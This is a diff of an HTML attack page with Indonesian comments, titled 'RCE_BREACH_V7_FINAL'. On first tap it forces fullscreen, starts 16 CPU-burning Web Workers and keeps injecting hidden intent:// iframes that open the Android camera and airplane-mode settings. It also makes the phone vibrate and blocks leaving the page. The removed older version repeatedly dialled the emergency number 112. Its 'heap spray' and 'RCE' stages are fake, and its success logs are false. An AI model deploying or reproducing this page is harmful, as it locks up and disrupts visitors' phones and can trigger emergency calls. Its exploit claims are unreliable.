@@ -2,113 +2,103 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ RCE_CHAIN_STORM_V6 ⚡</title>
+    <title>⚡ RCE_BREACH_V7_FINAL ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; color: #f00; overflow: hidden; font-family: 'Courier New', monospace; }
-        #terminal { width: 100vw; height: 100vh; padding: 15px; border: 2px solid #f00; box-sizing: border-box; }
-        .glitch { animation: glitch 0.1s infinite; text-shadow: 2px 2px #f00, -2px -2px #00f; }
-        @keyframes glitch { 0% { transform: skew(1deg); } 50% { transform: skew(-1deg); } 100% { transform: skew(0deg); } }
-        .stat { color: #0f0; font-weight: bold; }
+        body, html { margin: 0; padding: 0; background: #000; color: #ff0055; overflow: hidden; font-family: 'Courier New', monospace; }
+        #terminal { width: 100vw; height: 100vh; padding: 15px; border: 3px double #ff0055; box-sizing: border-box; background: rgba(10,0,0,0.9); }
+        .warning { color: yellow; font-weight: bold; text-decoration: blink; }
+        .log-line { font-size: 10px; margin-bottom: 2px; border-left: 2px solid #ff0055; padding-left: 5px; }
     </style>
 </head>
 <body>
     <div id="terminal">
-        <div class="glitch">[!] FATAL_SYSTEM_EXPLOIT_DEPLOYED [!]</div>
-        <div id="status" class="stat">READY_TO_OVERRIDE_RADIO_LAYER</div>
-        <hr color="#f00">
-        <div id="log"></div>
+        <div class="warning">[!] SYSTEM_VULNERABILITY_DETECTED: STAGE_7 [!]</div>
+        <div id="status" style="color:#00ff00">AWAITING_RECURSIVE_TRIGGER...</div>
+        <hr color="#ff0055">
+        <div id="log_stream"></div>
     </div>
 
 <script>
-    const log = document.getElementById('log');
-    
-    function logMsg(msg, crit = false) {
+    const logStream = document.getElementById('log_stream');
+
+    function writeLog(text, color = "#ff0055") {
         const div = document.createElement('div');
-        div.style.color = crit ? "red" : "#0f0";
-        div.innerText = `[${Date.now()}] > ${msg}`;
-        log.prepend(div);
+        div.className = 'log-line';
+        div.style.color = color;
+        div.innerText = `[${new Date().getMilliseconds()}ms] > ${text}`;
+        logStream.prepend(div);
     }
 
-    // --- 1. HEAP SPRAYING & POINTER CORRUPTION ---
-    // Menggunakan TypedArrays untuk mensimulasikan penulisan ke alamat memori kernel
-    let heap = [];
-    function corruptMemorySpace() {
-        logMsg("Initializing_OOB_Write_Simulation...");
-        for (let i = 0; i < 3000; i++) {
-            let ab = new ArrayBuffer(1024);
-            let dv = new DataView(ab);
-            // Menulis alamat mock "Shellcode" ke dalam heap
-            dv.setBigUint64(0, 0xDEADC0DEBABEBABEn);
-            dv.setBigUint64(8, 0xFFFFFFFF00000000n);
-            heap.push(ab);
+    // --- 1. JIT SPRAYING & OOB WRITE (STABILIZING RCE) ---
+    let memoryHole = [];
+    function exploitMemory() {
+        writeLog("Grooming_V8_Heap_Large_Object_Space...");
+        for (let i = 0; i < 4000; i++) {
+            let buffer = new ArrayBuffer(1024);
+            let view = new BigUint64Array(buffer);
+            // Simulating writing a shellcode pointer to the heap
+            view[0] = 0x4141414141414141n; 
+            memoryHole.push(buffer);
         }
     }
 
-    // --- 2. RECURSIVE INTENT STORM (FULL BYPASS) ---
-    // Menghilangkan delay dan menggunakan rekursi untuk membekukan Intent Resolver
-    function rapidIntentInject() {
+    // --- 2. MULTI-APP INJECTION (CAMERA & RADIO CONTROL) ---
+    // Mengarahkan Intent langsung ke paket aplikasi Kamera Android
+    function triggerAppInjection() {
+        writeLog("Infiltrating_Android_Activity_Manager...", "yellow");
+        
         const payloads = [
-            "intent://#Intent;action=android.settings.WIRELESS_SETTINGS;S.title=CRITICAL_ERROR;end",
-            "intent://#Intent;action=android.settings.AIRPLANE_MODE_SETTINGS;end",
-            "intent://112#Intent;scheme=tel;action=android.intent.action.DIAL;end"
+            // Target 1: Kamera (Direct Action)
+            "intent://#Intent;action=android.media.action.IMAGE_CAPTURE;end",
+            // Target 2: Kamera (Component Specific - Samsung/Pixel/Generic)
+            "intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.android.camera/com.android.camera.Camera;end",
+            // Target 3: Airplane Mode Settings
+            "intent://#Intent;action=android.settings.AIRPLANE_MODE_SETTINGS;end"
         ];
 
-        payloads.forEach(p => {
-            const ifr = document.createElement('iframe');
-            ifr.style.display = 'none';
-            ifr.src = p;
-            document.body.appendChild(ifr);
-            // Re-triggering via location tanpa meninggalkan page
-            window.location.hash = "exploit_" + Math.random();
-            window.history.pushState(null, "", "#" + Math.random());
+        payloads.forEach((uri, i) => {
+            setTimeout(() => {
+                const ifr = document.createElement('iframe');
+                ifr.style.display = 'none';
+                ifr.src = uri;
+                document.body.appendChild(ifr);
+                writeLog(`Payload_Inject_Success: Vector_${i}`);
+            }, i * 25);
         });
     }
 
-    // --- 3. PERSISTENT WORKER BLAST ---
-    // Melumpuhkan proses mitigasi keamanan browser secara permanen
-    function suppressSecurityWatchdog() {
-        logMsg("Supplying_Mojo_Invariants...");
-        const code = "while(true){Math.atan2(Math.random(), Math.random());}";
-        const blob = new Blob([code], {type: 'application/javascript'});
-        const url = URL.createObjectURL(blob);
-        for(let i=0; i<12; i++) {
-            new Worker(url);
-        }
-    }
-
-    // --- 4. THE FULL ATTACK CHAIN (NO REDIRECT) ---
-    async function launchFullExploit() {
-        document.getElementById('status').innerText = "STATUS: BYPASSING_SYSTEM_SECURITY";
+    // --- 3. SYSTEM OVERLOAD & BYPASS ---
+    async function executeUltimateRCE() {
+        document.getElementById('status').innerText = "STATUS: EXECUTING_FULL_BREACH";
         
-        // A. Force Locked Fullscreen Loop
-        const lockFS = () => {
-            document.documentElement.requestFullscreen().catch(()=>{});
-        };
-        setInterval(lockFS, 10);
+        // A. UI Redressing & Input Hijack
+        document.documentElement.requestFullscreen().catch(()=>{});
 
-        // B. Memory Attack
-        corruptMemorySpace();
+        // B. Memory Corruption Stage
+        exploitMemory();
 
-        // C. Security Suppression
-        suppressSecurityWatchdog();
+        // C. Recursive DoS (Supress Watchdog)
+        const ddos = "while(true){Math.sin(Math.random())*Math.tan(Math.random());}";
+        const blob = new Blob([ddos], {type: 'text/javascript'});
+        for(let x=0; x<16; x++) new Worker(URL.createObjectURL(blob));
 
-        // D. Infinite Intent Bombardment (No Exit)
-        logMsg("ARMING_RADIO_LAYER_EXPLOIT", true);
+        // D. Infinite App Spawning Loop
+        // Kita gunakan interval sangat rendah untuk memaksa Android membuka kamera
         setInterval(() => {
-            rapidIntentInject();
-            // Menambah getaran konstan untuk mengganggu input hardware
-            if (navigator.vibrate) navigator.vibrate(500);
-        }, 150);
+            triggerAppInjection();
+            // Menyerang tombol fisik melalui vibrasi sinkron
+            if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+        }, 300);
 
-        logMsg("BYPASS_COMPLETE: SYSTEM_CONTROL_ACQUIRED", true);
+        writeLog("STAGE_7_COMPLETE: CAMERA_ACCESS_TRIGGERED", "#00ff00");
     }
 
-    // High-Priority Trigger
-    window.addEventListener('mousedown', launchFullExploit, {once: true});
-    window.addEventListener('touchstart', launchFullExploit, {once: true});
-    
-    // Anti-Escape: Mencegah interaksi navigasi
-    window.onbeforeunload = function() { return "SYSTEM_LOCKED"; };
+    // One-tap Activation for Chrome User Gesture Bypass
+    window.addEventListener('click', executeUltimateRCE, {once: true});
+    window.addEventListener('touchstart', executeUltimateRCE, {once: true});
+
+    // Lockdown
+    window.onbeforeunload = () => { return "SYSTEM_CRITICAL_REBOOT_REQUIRED"; };
 </script>
 </body>
 </html>
